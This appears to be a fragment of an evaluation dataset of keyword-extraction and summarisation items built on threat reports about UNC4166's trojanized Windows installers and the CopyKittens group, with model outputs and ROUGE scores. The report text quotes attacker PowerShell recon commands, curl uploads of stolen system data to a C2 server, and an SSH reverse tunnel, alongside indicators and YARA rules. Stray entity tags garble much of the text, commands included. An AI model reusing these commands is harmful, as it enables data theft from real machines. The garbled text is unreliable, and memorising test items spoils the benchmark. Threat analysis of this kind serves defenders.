[DATE] 65001 ; [ console]::outputencoding = [ system.text.encoding]::UTF8 ; Start - Process powershell - argument \u201c Get - ComputerInfo [WORK_OF_ART] | Export - Csv [WORK_OF_ART] -path [WORK_OF_ART] sysinfo [WORK_OF_ART] -encoding [WORK_OF_ART] UTF8 \u201d -wait -nonewwindow ; curl.exe -H ( \u2018 h:\u2019+(wmic csproduct get UUID ) ) \u2013 data - binary \u201c @sysinfo \u201d -k url rm sysinfoThe download command is notable as the threat actor uses a hardcoded [ORG] UUID ( filefile - file - file - file- filefilefile ) , which we assess is likely a default value . It \u2019s unclear why the threat actor performed this additional request in favor of downloading the command itself ; we believe this may be used as a default command by the threat actors . Follow On [ORG] TaskingIf [ORG] UNC4166 determined a device likely contained intelligence of value , subsequent actions were take on these devices . Based on our analysis , the subsequent tasking fall into [CARDINAL] three categories : Deployment of tools to enable exfiltration of data ( like [ORG] TOR and Sheret ) Deployment of additional lightweight backdoors likely to provide redundant access to the target ( like SPAREPART)6/14Deployment of additional backdoors to enable additional functionality ( like BEACON and STOWAWAY)TOR [PERSON] Browser [PERSON] DownloadedIn some instances , [ORG] Mandiant identified that the threat actor attempted to download the [ORG] TOR browser onto the victim \u2019s device . This was originally attempted through downloading the file directly from the [CARDINAL] C2 via curl . However , the following day the actor also downloaded a [ORDINAL] second TOR installer directly from the official torprojects.org website . It \u2019s unclear why the threat actor performed these actions as [ORG] Mandiant was unable to identify any use of [ORG] TOR on the victim device , although this would provide the actor a [ORDINAL] second route to communicate with infrastructure through [ORG] TOR or may be used by additional capability as a route for exfiltration . We also discovered the [ORG] TOR installer was also hosted on some of the backup infrastructure , which may Downloaded from url Downloaded from https:// 56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe / bundle.zipUse of Sheret HTTP Server and localhost[.]runIn some instances , the threat actor deployed a publicly available HTTP server called Sheret to conduct data theft interactively on victim devices . The threat actor configured Sheret to server locally , then using [ORG] SSH created a tunnel from the local device to the service localhost[.]run . In [CARDINAL] at [CARDINAL] least [CARDINAL] one instance , this web server was used for serving files on a removable drive connected to the victim device and [ORG] Mandiant was able to confirm that multiple files were exfiltrated via this mechanism . The command used for [ORG] SSH tunnelling was : ssh -R [CARDINAL] 80 : localhost:80 -i defaultssh localhost[.]run -o stricthostkeychecking = no > > sysinfoThis command configures the local system to create a tunnel from the local device to the website Publicly available as a build from url Compiled date : [CARDINAL] 1970/01/01 [CARDINAL] 00:00:00Deployment of SPAREPART , Likely as a Redundant BackdoorWe identified the creation of a service following initial recon that we believe was the deployment of a redundant backdoor we call [ORG] SPAREPART . The service named \u201c [ORG] Microsoft [ORG] Delivery [ORG] Network \u201d was created to7/14execute % SYSTEM32%\\MicrosoftDeliveryNetwork\\MicrosoftDeliveryCenter with the arguments \u201c [CARDINAL] 56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe powershell.exe \u201d via the Windows SC command . [PERSON] Functionally [PERSON] SPAREPART is identical to the [ORG] PowerShell backdoors that were deployed via the schedule tasks in the original ISOs . [ORG] SPAREPART is executed as a [ORG] Windows [ORG] Service [ORG] DLL , which upon execution will receive the tasking and execute via piping the commands into the [ORG] PowerShell process . [ORG] SPAREPART will parse the raw SMIBOS firmware table via the Windows GetSystemFirmwareTable , this code is nearly identical to code published by [ORG] Microsoft on [GPE] Github . The code \u2019s purpose is to obtain the UUID of the device , which is later formatted into the same header ( h : < UUID ) for use in communications with the [CARDINAL] C2 server . Figure [CARDINAL] 4 : SPAREPART formatting of headerThe payload parses the arguments provided on the command line . Interestingly there is an error in this parsing . If the threat actor provides a single argument to the payload , that argument is used as the URL and tasking can be downloaded . However , if the [ORDINAL] second command ( in our instance powershell.exe ) is missing , the payload will later attempt to create a process with an invalid argument which will mean that the payload is unable to execute commands provided by the threat actor . Figure [CARDINAL] 5 : SPAREPART parsing threat actor [PERSON] inputSPAREPART has a unique randomization for its sleep timer . This enables the threat actor to randomise beaconing timing . The randomisation is seeded of the base address of the image in memory , this value is8/14then used to determine a value between 0 and 59 . This value acts as the sleep timer in minutes . As the backdoor starts up , it \u2019ll sleep for [TIME] up [TIME] to [TIME] 59 [TIME] minutes before reaching out to the C2 . Any subsequent requests will be delayed for between 3 and 4 hours . If after [CARDINAL] 10 sleeps the payload has received no tasking ( 30 - 40 [TIME] hours of delays ) , the payload will terminate until the service is next executed . Figure [CARDINAL] 6 : SPAREPART randomizing the time for next beaconAfter the required sleep timer has been fulfilled , the payload will attempt to download a command using the provided URL . The payload attempts to download tasking using the [ORG] WinHttp set of APIs and the hard coded user agent \u201c [WORK_OF_ART] Mozilla/5.0 ( [WORK_OF_ART] Windows [WORK_OF_ART] NT [WORK_OF_ART] 10.0 ; Win64 ; x64 ; rv:91.0 ) Gecko/20100101 Firefox/91.0 \u201d . The payload attempts to perform a GET request using the previously formatted headers , providing the response is a valid status ( [CARDINAL] 200 ) , the data will be read and written to a previously created pipe . Figure [CARDINAL] 7 : SPAREPART downloading payloadIf a valid response is obtained from the [CARDINAL] C2 server , the payload will create a new process using the [ORDINAL] second argument ( powershell.exe ) and pipe the downloaded commands as the standard input . The payload makes no attempt to return the response to the actor , similarly to the [ORG] PowerShell backdoor.9/14Figure [CARDINAL] 8 : SPAREPART executing a commandAlthough we witnessed the installation of this backdoor , the threat actor reverted to the [ORG] PowerShell backdoor for tasking [TIME] a [TIME] couple [TIME] of [TIME] hours [TIME] later . Due to the similarities in the payloads and the fact the threat actor reverted to the [ORG] PowerShell backdoor , we believe that [ORG] SPAREPART is a redundant backdoor likely to Compiled on : [CARDINAL] 2022/11/28 02:32:33 [ORG] PDB path : C:\\Users\\user\\Desktop\\ImageAgent\\ImageAgent\\PreAgent\\src\\builder\\agent.pdbDeployment of Additional BackdoorsIn addition to the deployment of [ORG] SPAREPART , the threat actor also deployed additional backdoors on some limited devices . In [DATE] early [DATE] September , [ORG] UNC4166 deployed the payload AzureSettingSync.dll and configured its execution via a schedule task named [ORG] AzureSync on [CARDINAL] at [CARDINAL] least [CARDINAL] one device . The schedule task was configured to execute [ORG] AzureSync via rundll32.exe . AzureSettingSync is a [ORG] BEACON payload configured to communicate with cdnworld.org , which was [ORG] Original name : [PERSON] tr2fe.dll Compiled on : [CARDINAL] 1970/01/01 00:00:00 [ORG] Connects to url \u2013 general - feedback / suggestions/35703616 - cdn \u2013 Connects to url \u2013 general / sync/42823419 - cdn10/14Due to remediation on some compromised devices , we believe that the BEACON instances were quarantined on the devices . Following this , we identified the threat actor had deployed a STOWAWAY Compiled on : [DATE] 1970/01/01 00:00:00 Compiled on : [DATE] 1970/01/01 00:00:00 Scheduled TasksC:\\Windows\\System32\\Tasks\\MicrosoftWindowsNotificationCenter ( MD5 : url -H ( ' h:'+ ( wmic csproduct get UUID ) ) | powershellTrojanized Scheduled TasksC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo ( MD5 : C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement SODUsvc11/14On Host Recon CommandsGet - ChildItem -Recurse -Force -Path ( ( C:)+ \u2019 ' ) [ORG] | Select - Object [ORG] -Property [ORG] Psdrive , [ORG] FullName , [PERSON] Length , [ORG] Creationtime , lastaccesstime , lastwritetime | Export - Csv -Path sysinfo -encoding UTF8 ; Compress- Archive -Path sysinfo -DestinationPath sysinfo.zip -Force ; Get - ComputerInfo [ORG] | Export - Csv [ORG] -path sysinfo -encoding UTF8 invoke - restmethod url | Export - Csv -path sysinfo -encoding UTF8 Get - Volume | Where - Object { .DriveLetter -and .DriveLetter -ne \u2018 C \u2019 -and .DriveType -eq \u2018 Fixed \u2019 } | ForEach - Object { Get - ChildItem -Recurse -Directory ( .DriveLetter+ \u2018 :\u2019) [ORG] | Select - Object [ORG] -Property [ORG] Psdrive , [ORG] FullName , [PERSON] Length , [ORG] Creationtime , lastaccesstime , lastwritetime | Export - Csv -Path sysinfo - encoding UTF8 ; Compress - Archive -Path sysinfo -DestinationPath sysinfo -Force ; curl.exe -H ( \u2019 h:\u2019+ ( wmic csproduct get UUID ) ) \u2013 data - binary \u2018 @sysinfo.zip \u2019 -k url chcp [DATE] 65001 ; [ console]::outputencoding = [ system.text.encoding]::UTF8 ; Start - Process powershell - argument \u201c Get - ComputerInfo [WORK_OF_ART] | Export - Csv [WORK_OF_ART] -path [WORK_OF_ART] sysinfo [WORK_OF_ART] -encoding [WORK_OF_ART] UTF8 \u201d -wait -nonewwindow ; curl.exe -H ( \u2018 h:\u2019+(wmic csproduct get UUID ) ) \u2013 data - binary \u201c @sysinfo \u201d -k url rm sysinfoTrojanized [ORG] Windows [ORG] Image [ORG] Network [ORG] IndicatorsIndicators [ORG] of [NORP] Compromise56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid[.]onion[.]moeufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]moeufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]wsBEACON [NORP] C2surl \u2013 general - feedback / suggestions/35703616 - cdn \u2013 url \u2013 general / sync/42823419 - cdnSignature Tor C2STOWAWAY C2s193.142.30[.]166:443 91.205.230[.]66:8443Appendix MITRE ATT&CK FrameworkATT&CK Tactic Category Techniques Initial AccessPersistenceT1195.002 : Compromise Software Supply Chain12/14DiscoveryExecutionDefense EvasionCommand and [ORG] ControlResource DevelopmentT1136 : T1543.003 : Windows ServiceCreate AccountT1049 : System Network Connections DiscoveryWindows Management Instrumentation Command and Scripting InterpreterT1047 : T1059 : T1059.001 : [ORG] PowerShell T1059.005 : Visual Basic T1569.002 : Service ExecutionObfuscated Files or Information Process Injection Deobfuscate / Decode Files or InformationT1027 : T1218.011 : [PRODUCT] Rundll32 [PRODUCT] T1562.004 : Disable or [ORG] Modify [ORG] System [ORG] Firewall T1574.011 : [ORG] Services [ORG] Registry [ORG] Permissions WeaknessT1071.004 : [ORG] DNS T1090.003 : Multi - hop Proxy T1095 : [CARDINAL] T1573.002 : [PERSON] Asymmetric CryptographyNon - Application Layer ProtocolT1587.002 : Code Signing Certificates T1588.004 : [ORG] Digital [ORG] Certificates [ORG] T1608.003 : [ORG] Install [ORG] Digital [ORG] CertificateDetection [ORG] Rules date_created = \" [DATE] 2022 - 12 - 14 \" description = \" Detects the algorithm used to determine the next sleep timer \" disclaimer = \" This rule is meant for hunting and is not tested to run in a $ = { [CARDINAL] C1 E8 06 89 [ [CARDINAL] 5 ] C1 E8 02 8B } $ = { c1 e9 03 33 c1 [ [CARDINAL] 3 ] c1 e9 05 33 c1 [DATE] 83 [DATE] e0 [DATE] 01 } $ = { [CARDINAL] 8B [CARDINAL] 80 FC 00 00 00 } $ = { D1 [CARDINAL] E8 [ [CARDINAL] 4 ] c1 E1 0f 0b c1 } condition : all of them date_created = \" [DATE] 2022 - 12 - 14 \" description = \" [WORK_OF_ART] Detects [WORK_OF_ART] the [WORK_OF_ART] PDB and a struct used in SPAREPART \" disclaimer = \" This rule is meant for hunting and is not tested to run in a \" c:\\\\Users\\\\user\\\\Desktop\\\\ImageAgent\\\\ImageAgent\\\\PreAgent\\\\src\\\\builder\\\\agent.pdb \" ascii nocase $ struct = { [DATE] 44 [DATE] 89 ac ? ? ? ? ? ? ? ? ? ? [CARDINAL] 4 ? [CARDINAL] 8b ac ? ? ? ? ? ? ? ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c5 [CARDINAL] 28 89 84 ? ? ? ? ? ? ? ? ? ? [CARDINAL] 89 8c ? ? ? ? ? ? ? ? ? ? [DATE] 89 [DATE] 54 ? ? ? ? 44 89 44 ? ? ? ? [CARDINAL] 44 89 [CARDINAL] 4c ? ? ? ? 44 89 54 ? ? ? ? [CARDINAL] 44 89 5c ? ? ? ? [CARDINAL] 89 [CARDINAL] 5c ? ? ? ? [CARDINAL] 89 7c ? ? ? ? [DATE] 89 [DATE] 74 ? ? ? ? [CARDINAL] 89 6c ? ? ? ? 44 89 74 ? ? ? ? [CARDINAL] 44 89 7c ? ? ? ? 44 89 64 ? ? ? ? 8b [CARDINAL] 84 ? ? ? ? ? ? ? ? ? ? [CARDINAL] 44 [CARDINAL] 8b c8 [CARDINAL] 8b 84 ? ? ? ? ? ? ? ? ? ? [CARDINAL] 44 [CARDINAL] 8b c0 [CARDINAL] 4 ? 8d [CARDINAL] 15 ? ? ? ? ? ? ? ? [CARDINAL] 4 ? [CARDINAL] 8b cd ff [CARDINAL] 15 ? ? ? ? ? ? ? ? } condition : ( uint16(0 ) = = [CARDINAL] 0x5A4D ) and [PERSON] uint32(uint32(0x3C ) ) = = 0x00004550 and filesize < 20KB}14/14", "generated_text": "Mandiant; an operation; Ukrainian government entities; trojanized Windows 10 Operating System installers; Trojanized ISO files; torrent sites; use; Ukrainian users; the malware; information; the compromised system; additional capabilities; victims; data theft; the trojanized ISO; Ukrainian; malware; targeting; the Ukrainian government; wiper attacks; APT28; the tool; time; resources; espionage; attacks; the use; a mandate; steal information; the Ukrainian government; Ukraine; wiper attacks; APT28; wiper clusters; the deployment; activities; Targeted; disruptive wiper attacks; this operation; efforts; threat intelligence; the actor; this activity; security; patience; the operation; a mandate; information.", "ref_text": "<START-1>The document discusses threat activity tracked as UNC4166 targeting the Ukrainian government through trojanized Windows 10 installers distributed via torrent sites. The installers contained scheduled tasks that gathered system info and communicated with TOR C2 servers. If targets were deemed of interest, additional malware would be deployed for further reconnaissance and data theft, including the backdoors STOWAWAY, BEACON, and SPAREPART. SPAREPART in particular is a lightweight backdoor that generates random sleep times before beaconing to C2 infrastructure. The trojanized installers were designed to target Ukrainian users by utilizing the Ukrainian language pack. Multiple Ukrainian government organizations were compromised after installing the malware. While attribution could not be definitively made, UNC4166's targeting overlaps with previous GRU-related activity against Ukraine. The supply chain compromise and anti-detection capabilities indicate a sophisticated threat actor. Indicators of compromise and Yara rules are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4563380281690141, "gpt3/lexical/rouge_rouge2": 0.15297450424929177, "gpt3/lexical/rouge_rougeL": 0.2591549295774648, "gpt3/lexical/rouge_rougeLsum": 0.2591549295774648, "gpt3_generated_text": ["The article discusses an operation conducted by Mandiant, targeting Ukrainian government entities through trojanized Windows 10 Operating System installers. The trojanized ISO files were distributed via torrent sites as part of a supply chain attack. The malware dropped by the installers conducted reconnaissance and deployed additional capabilities to conduct data theft. The trojanized files were designed to target Ukrainian users and used the Ukrainian language pack. The article highlights that while Mandiant does not have enough information to attribute the operation to a specific sponsor or group, the targets of the operation overlap with organizations previously targeted by GRU-related clusters with wipers at the beginning of the war. The use of trojanized ISOs in this espionage operation is considered novel, indicating that the actors behind it are security-conscious and patient. Mandiant believes that the actor behind this operation has a mandate to steal information from the Ukrainian government. The article also mentions the deployment of additional payloads, such as the STOWAWAY and BEACON backdoors, on some victims' devices. The motivations behind the operation do not appear to be financial, as there is no indication of theft or ransomware deployment. The article emphasizes the need for supply chain security and highlights the potential for major disruptive attacks that may extend beyond conflict zones."]}, {"split_name": "test", "sample_id": "test_96", "prompt_text": "Extract the keywords: CopyKittens [PRODUCT] Attack [PRODUCT] GroupVersion [PRODUCT] 1.0 \u2013 23/11/2015All Rights Reserved To Minerva Labs LTD and [ORG] ClearSky [ORG] Cyber [ORG] Security , 2015Contents Executive Summary 3The Group [PERSON] Attack [PERSON] Cycle 4Step [CARDINAL] One \u2013 Spear Phishing 4Step [CARDINAL] Two - Droppers Matryoshka [CARDINAL] 6Dropper \u2013 SCR PE File [CARDINAL] 6Step [ORG] Three [ORG] - [ORG] Reflective [ORG] Loader 8Step Four - RAT Component 10Runtime API Address Resolution 10Installation and [ORG] Persistence [ORG] 10DNS [ORG] Command [ORG] & [ORG] Control [ORG] 11Common [ORG] RAT [ORG] Capabilities 13Improvement Over Time 15About [GPE] Us [PERSON] 16Minerva [PERSON] Labs 16ClearSky Cyber Security 16Appendix A \u2013 Spear Phishing Examples 17Appendix B \u2013 Indicators of Compromise 202Executive Summary [LOC] The [LOC] Middle [LOC] East has been a cyber warfare hotspot for [DATE] almost [DATE] a [DATE] decade now , a theatre for some of the most advanced threats the world has ever witnessed . In between those highly advanced attacks , more and more attackers possessing only a basic set of skills started to pop up \u2013 spreading well known RATs , obfuscated with generic publicly - available packers . This report focuses on the [ORG] CopyKittens , a mid - level group . The [ORG] CopyKittens attacks are effective and advanced in a few ways:\uf0b7Infecting of computers is performed in multi - stage , stealthy [ORG] method\uf0b7 [ORG] Data exfiltration is performed over [ORG] DNS protocol\uf0b7 They avoid using known RATs and packers , tools are \" homemade\"\uf0b7 Constant development is performed to overcome security products improvementsYet , this group is clearly not made up of [CARDINAL] dozens of high - end computer and security experts . The [ORG] CopyKittens assembled major parts of their attack from code snippets carefully picked from public repositories and online forums , hence their nickname . We also named their attack tool \" Matryoshka\"1 due to the fact that it was written as a multi - stage framework , with each part of it built to integrate its subsequent step . We have had only a partial window to the targets of these semi - sophisticated yet highly effective attacks . Among them were high ranking diplomats at [ORG] Israel \u2019s [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs and some well - known [NORP] Israeli academic researchers specializing in [LOC] Middle [LOC] East [LOC] Studies . Even if we combine this with the fact that attackers goal seemed to be theft of sensitive data , we still lack the ability to clearly identify who is behind this attacks and if it was sponsored by another major actor . In our opinion , this will not be the last time we hear from this group . Their constant striving toward improved performance , the fact that they probably executed successful attacks and the current turmoil in [LOC] the [LOC] Middle [LOC] East region leads us to the conclusion that the [ORG] CopyKittens will keep striking targets with similar profiles in the near future.1 url Group Attack Cycle CopyKittens has conducted [CARDINAL] at [CARDINAL] least [CARDINAL] three waves of cyber - attacks in [DATE] the [DATE] past [DATE] year . In each of the attacks the infection method was almost identical and included an extraordinary number of stages used to avoid detection . As with other common threat actors , the group relies on social engineering methods to deceive its targets prior to infection . Step [CARDINAL] One \u2013 Spear Phishing The attack is initiated by sending an infected document file as an email attachment . In most cases the email subjects have been carefully chosen to match the target \u2019s interests . We were able to retain a copy of an email used to target an [NORP] Israeli ambassador in a large eastern [NORP] European country . Some of the emails subjects were:1 . Registration form to [ORG] the [ORG] United [ORG] Nations [ORG] CTITF ( Counter Terrorism Implementation Task Force ) . [ [NORP] Israeli [ORG] MFA ] questionnaire - URGENT \u2013 An original paper , probably stolen in previous attacks2 . 2.The email contains the [ORDINAL] first link in the chain , a word document , containing an [ORG] OLE binary object.2 url embedded binary objects in the lure documents contained a trailing \u201c fdp.scr \u201d in their names with a special invisible [PERSON] Unicode character . This character officially described as \" Right - To - Left Override \" flips the directionality of the string from its position and onward . For example , if we name a file \" filename [ special flipping char]fdp.scr \" it will be displayed as \" filename [ORG] rcs.pdf\u201d . This form of subterfuge has been previously employed by other [NORP] Middle [NORP] Eastern threat actors such as \u201c [PERSON] Desert [PERSON] Falcons \u201d , reported by [PERSON] Kaspersky3 and by elements operating in Syria4.In other cases , the document includes instructions motivating the victim to enable macro code execution . If the trap is successful and the user played his part , the infection stage begins.3 url [CARDINAL] 4 url [CARDINAL] Two - Droppers Matryoshka Unlike most malwares , [ORG] CopyKittens \u2019 tools are bound to each other . The Matryoshka infection framework is built of [CARDINAL] three parts:\uf0b7 [PERSON] Droppero [PERSON] Obfuscating code and signaling to the C2 that the file has been executed o Launching the loader and using it to execute functions . o Comparing anti - analysis logic and reporting it back to C2\uf0b7 Reflective Loadero Employing anti - debugging and anti - sandboxing techniques o Runtime API Address resolver o Covert DLL injection of the [ORG] RAT library o [ORG] Persistence file on disk\uf0b7 RAT componento Configuring the Reflective Loader to survive reboots and process exits o [ORG] DNS [ORG] Command and [NORP] Control communication o Common [ORG] RAT functionalitiesDropper \u2013 SCR PE File Files with scr extension are just the same as exe executables . Windows screen savers originally used this extension but nowadays medium - level threat actors commonly use it as a way to deceive the average user who might be deterred from an exe file extension . The dropper name always matched the promised content of the spear phishing email . In the latest version of the dropper , the lure pdf is saved to the user \u2019s % TEMP% folder with an \u201c ~st \u201d prefix and random number , followed by a \u201c .pdf \u201d extension . Once the file has been successfully saved , the pdf is opened and displayed to the user via [PRODUCT] ShellExecute [PRODUCT] API and [PERSON] Open command . This is done to lower the target 's suspicions and mask the true functionality of the executable . While the user unsuspectingly reads the document , the following routine runs hidden in the background : The malware [ORDINAL] first unpacks the \u201c [WORK_OF_ART] Reflective [WORK_OF_ART] Loader \u201d component into the memory and signals to its \u201c C2 parents \u201d the attack has been executed by downloading an image file from a remote server . The URL of the remote file is built out of [CARDINAL] two constant strings which again might suggest some kind of builder to this platform.\uf0b7 We believe the [ORDINAL] first string to be a unique ID of the target or sample . \uf0b7 The [ORDINAL] second is the full URL \u2013 \u201c HTTP://DOMAIN/\u201dRandomString\u201d/%s(TargetID)/\u201dCampgainIdentifer\u201d/\u201dNameOFFile\u201d.png\u201dAfter signaling to the attackers , the malware calls a specific export function from the Reflective Loader named \u201c _ check \u201d . This routine is a copied code from the \u201c Pafish \u201d open source project , led6by [PERSON] Alberto [PERSON] Ortega ( [PERSON] @a0rtega)5 who describes it as : \u201c A demonstration tool that employs several techniques to detect sandboxes and analysis environments in the same way as malware families do\u201d . [NORP] Pafish will enumerate and look for known virtualization and sandbox artifacts and then print results back to the researcher screen . Since the original [NORP] Pafish code is built to improve security researchers \u2019 ability to discover evasive malware , the [ORG] CopyKittens group has modified the code logic . Instead of printing the functions \u2019 results back to the user , the code will now assign a static number from 1 [DATE] - 27 in the case of an artifact being found , and will return that value to the calling function ( the SCR dropper in this case).Upon returning from the \u201c _ check \u201d function , the dropper will perform a simple comparison and if an analysis machine has been detected , it will signal the attackers again using almost the same URL as it did before but replacing the name of the \u201c .png \u201d file to the letter \u201c n \u201d concatenated with the number of the artifact found by [NORP] Pafish . Below is a table demonstrating the artifacts and their corresponding value : sandbox usernames and paths1,2Generic sandbox sleep patchDeleteFile is hookedSandboxie sbiedll is injectedWine Linux emulator is presentRunning in [PRODUCT] Virtualbox [PRODUCT] VMRunning in [ORG] VMWARE [ORG] VMRunning in [GPE] QEMU VM56789 - 2122 [CARDINAL] - 2526,275 url our investigation we were able to identify an example of this behavior in a [ORG] VirusTotal report on [CARDINAL] one of the domains used by the attackers : We believe this URL was submitted by a target or other researchers analyzing the malware . After alerting the attackers they have been discovered , the dropper will try to delete the temporary files created by him and terminate activity of the infection process . In the case no analysis machine is found , [PERSON] Reflective [PERSON] Loader will be called again with the \u201c _ dec \u201d ( possibly abbreviation of the word \u201c decrypt \u201d ) and the [ORDINAL] third stage of the attack will commence . Step [CARDINAL] Three - Reflective Loader In an attempt to increase stealthiness , the [ORG] CopyKittens group has decided to use another open source project6 by [PERSON] Stephen [PERSON] Fewer ( @stephenfewer ) . The project implements a remote library injection technique called \u201c [WORK_OF_ART] Reflective [WORK_OF_ART] DLL [WORK_OF_ART] Injection \u201d . Fewer describes the method in his paper7:\u201cReflective [ORG] DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process \u201d . This method enables the [ORG] RAT library to run on the host machine without a dedicated process and without registration of the library under the loaded modules . The original project was built as a command line utility with the target process identifier provided as an argument . In a real attack scenario , the injected process identifier is obviously unknown to the attacker and a suitable host process should be located at runtime . The [ORG] CopyKittens group has implemented this routine by using WTSEnumerateProcess API to get a list of current active processes and then trying to get a handle to each process via OpenProces API , avoiding x64 processes.6 url [CARDINAL] 7 url a suitable host has been found for infection , the rest of [GPE] Fewer \u2019s project code will be used to inject the malicious library and execute the [PERSON] RAT.9Step [CARDINAL] Four - RAT Component The main part of \u201c Matryoshka \u201d is a remote administration tool library . It is designed to exist in the infected computer memory and is never written to the computer 's physical disk itself . When we \u201c dumped \u201d the [ORG] RAT to the disk , some of the AV tools detect it with the following signatures : [GPE] Trojan . [PERSON] Jectin identified on [DATE] April [DATE] 9th [DATE] 2015 by Symantec8.Troj / Agent - AMEY that was identified on [DATE] March [DATE] 25th [DATE] 2015 by Sophos9.This , however , is not the case while the [ORG] RAT is injected into a legitimate host process . Runtime API Address Resolution Since the library is injected into memory , the imported functions must be resolved in runtime , to solve this problem the [ORG] CopyKittens group used a method called \u201c [WORK_OF_ART] Runtime [WORK_OF_ART] API [WORK_OF_ART] Address Resolution\u201d10 using the LoadLibrary and GetProcAddress APIs . In order to evade static virus scanners in new version of the [ORG] RAT , the attackers obfuscated the names of the API functions . They resolve them in runtime using a simple substitute cipher combined with [PERSON] Base64 encoding . The same trick was used in the Reflective Loader component . We retrieved the original functions names as plaintext strings by using a simple Python script . A list of decrypted API strings and the python code can be found in the [NORP] Appendix and Minerva Labs Research GitHub repository11.Installation and Persistence Since the [ORG] RAT library was built to run from the memory of a host process , it relies on the loader to survive system restart . The [ORDINAL] first time the [ORG] RAT runs , it will copy the reflective loader , named \u201c [PERSON] kernel.dll \u201d to [CARDINAL] one of [EVENT] Windows \u2019 common folders and will create a registry key named { 0355F5D0- [CARDINAL] 467C-30E9 - 894C - C2FAEF522A13 } under \u201c SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u201d with the value of \u201c C:\\Windows\\System32\\rundll32.exe \" \\%LOCATION%\\kernel.dll \" _ dec \u201d to re- run the injection routine after each boot . In addition , to make sure the [ORG] RAT always runs ( since host process might be closed or crash ) , the [ORG] RAT creates a task in the [PRODUCT] Windows task scheduler named \u201c [ORG] Microsoft [ORG] Boost [ORG] Kernel [ORG] Optimization \u201d which will re - run the injection routine [TIME] every [TIME] 20 [TIME] minutes . The task scheduler method has also been added to the newest version of the RAT.8 url [CARDINAL] 9 url ~ Agent- [GPE] AMEY / detailed - analysis.aspx 10 url m_of_api_obfuscation_on_win32.pdf [CARDINAL] 11 url makes the [ORG] RAT unstable as multiple instances may be executed simultaneously on the same host machine causing unexpected behavior . To reduce this risk , the authors have used a global mutex . [ORG] DNS [ORG] Command [ORG] & [ORG] Control The [ORG] RAT uses [ORG] DNS protocol to communicate with the attackers C2 server . The [ORG] DNS queries are constructed from the following sections:1 . C2 domain name2 . The unique ID of the infected machine ( computer name + HD serial3 . Random string4 . Data to be transmitted . To make traffic analysis and detection more difficult , the group uses a substitute cipher to obfuscate the data before it is sent to the C2:11Another way used to disguise the [ORG] DNS traffic and lower the suspicions of [ORG] SOC and [ORG] NOC teams was the use IPs from address blocks of [ORG] Microsoft and McAfee in the C2 responses : Once a command is received from the [CARDINAL] C2 server in the [ORG] DNS response , the [ORG] RAT will translate it to try and steal outlook passwords.12Common RAT Capabilities Outlook passwords This functionality resembles a method described by SecurityExploded 12 for \u201c [WORK_OF_ART] Recovering [WORK_OF_ART] Passwords from Outlook 2002 [DATE] - [DATE] 2013 \u201d . We can assume that the group has copied this code as well . Screen Grabbing and Keylogging This [ORG] RAT is also capable of screen grabbing and keylogging . Unsurprisingly , here too we were able to trace back a portion of the original source code from the popular rohitab.com online forum13 .12 url ( Recovering Passwords from Outlook [DATE] 2002- [DATE] 2013 ) [CARDINAL] 13 url interesting fact is that the author also copied the registry key described in the installation stage above , replacing only a single character of the original randomly generated unique ID.14Improvement Over Time In comparing samples from different attack cycles , we can easily see that the attackers have spent time improving their tool , making it more persistent and harder to detect . For example , between the [ORDINAL] first versions of the [ORG] RAT and the latest , the group started to resolve more API during runtime , using obfuscated strings . A comparison of the outlook password extraction function from previous and current [ORG] RAT versions can be seen below . In addition , the group has been adding anti sandboxing techniques , such as the code from [NORP] Pafish described above and anti - debugging methods : This anti - debugging code seems to have been copied from [ORG] CodeProject14 , a well - known online source.14 url LabsAbout UsClearSky Cyber SecurityClearsky is a cybersecurity consulting and intelligence company . We provide strategic consulting , threat intelligence , solutions and services \u2013 all in the cyber domain . Our team of highly experienced cyber infoworkers , analysts and researchers constantly run a targeted and extensive evaluation of cyber threats and risks . They generate breaking alerts , updates , advisories and notifications for security and operations centers , IT , risk officers , and management . We help our customers stay ahead of threats , make the necessary adjustments to organizational policies and procedures , and re - configure and adapt security and IT systems . We assist and coach the organization to formulate and implement a cyber - event handling program and crisis level situation assessment and decision making.info@clearskysec.comurl offers a low footprint endpoint protection platform . Minerva brings a completely new paradigm to the malware detection problem , focusing on preventing malware execution by using the malware \u2019s strengths against it . The security platform simultaneously empowers existing security products and improves detection rates , thus organization \u2019s overall return on security investment . [ORG] Time is of the essence ; when it comes to data breaches there is often significant damage by the time a threat is detected.improvingtheMinerva -Don't chase , [ORG] Prevent!info@minerva-labs.comurl [ORG] A \u2013 Spear Phishing Examples [DATE] April [DATE] 2015 : \" [WORK_OF_ART] Registration [WORK_OF_ART] Form to [ORG] the [ORG] United [ORG] Nations CTITF\"February 2015 : \" [NORP] Israeli [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs [ORG] Questionnaire\u201d17Embedded in the Word document was [FAC] Quest__fdp.scr , disguised as [DATE] PDFEarly [DATE] 2015 : \" [GPE] Israel [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs [ORG] Diplomatic List\"18Early [DATE] 2015 : \" [WORK_OF_ART] Strike [WORK_OF_ART] in [WORK_OF_ART] the [WORK_OF_ART] Ministry [WORK_OF_ART] of [WORK_OF_ART] Foreign [WORK_OF_ART] Affairs\"19Appendix [WORK_OF_ART] B [WORK_OF_ART] \u2013 [WORK_OF_ART] Indicators [WORK_OF_ART] of [WORK_OF_ART] Compromise [WORK_OF_ART] C2 [WORK_OF_ART] Domains img.gmailtagmanager[.]comwindowkernel[.]comwindowslayer[.]inwindowkernel[.]comwheatherserviceapi[.]infowethearservice[.]comwindowslayer[.]inu[.]mywindows24[.]inmain[.]windowskernel14[.]comwalla[.]linkheartax[.]infohaaretz[.]linkHaaretz [WORK_OF_ART] - 